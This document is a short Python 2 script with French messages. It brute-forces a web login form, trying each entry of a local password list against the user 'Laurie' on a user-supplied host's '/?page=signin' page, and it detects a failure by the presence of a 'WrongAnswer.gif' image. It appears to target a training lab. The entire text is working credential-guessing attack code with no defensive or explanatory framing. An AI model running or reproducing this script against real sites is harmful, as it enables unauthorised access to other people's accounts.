import urllib
import urllib2
import re
import time

url_input = raw_input("Url du site(ex: 10.12.1.115): ")

with open('password_list.txt') as file:
    tmppwd = file.readlines()

total = 0
debut = time.time()
print("Running..")
for pwd in tmppwd:
    if time.time() - debut > 30:
        total = total + (time.time() - debut)
        debut = time.time()
        print("%.3f sec" % total)
    pwd = pwd.rstrip()
    payload = urllib.urlencode({'username': 'Laurie', 'password': pwd, 'Login': 'login'})
    url = 'http://' + url_input + '/?page=signin&' + payload

    try:
        ret = urllib2.urlopen(url)
    except:
        print("  !!! L'url n'a pas l'air bonne !!!")
        exit()

    find = re.search('<img src="images/WrongAnswer.gif" alt="">', ret.read())
    if find is None:
        print("[+] >>>>>>>>> " + pwd + " <<<<<<<<<<<")
        print("%.3f" % (total + (time.time() - debut)) + " sec")
        break
    else:
        print("[-] " + pwd)
